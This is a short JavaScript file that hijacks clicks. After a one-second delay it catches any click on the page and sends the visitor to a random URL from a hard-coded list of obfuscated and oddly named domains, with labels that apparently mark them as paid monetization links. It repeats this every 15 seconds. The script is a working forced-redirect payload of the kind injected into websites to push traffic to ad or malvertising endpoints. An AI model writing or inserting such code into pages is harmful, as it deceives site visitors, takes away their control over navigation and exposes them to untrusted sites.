function init() {
  var arr = [
    // hil: Jacklove
    "https://indolent-ability.com/bB3uV.0iPV3spPvtbVmHV/JQZ_DU0k1rMZzEgixBM/D/A_wFL/T/U_zgOvDKEawzMRDBEJ",
    "https://indolent-ability.com/by3hV/0XP.3np/v-bRmrV/JQZ/DM0/1ZMuz/gAx/MCDKAR4qLQTRUdznOrD/EzwVMBDbkt",
    "https://indolent-ability.com/bV3HVj0QP.3bpVvbbcmeVLJIZ/DF0M1-Maz-gwxbM/DYE/2kLfTGUvzEOrDkEJwOMaT_cg",

    // mon: db
    "https://glooghalty.net/4/7237941",
    "https://owhopteefi.net/4/7436813",
    "https://pseleedrax.net/4/7237942",
    "https://beewoupaule.net/4/7420696",
    "https://koachewhome.net/4/7237921",
    "https://faireegli.net/4/7474716",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);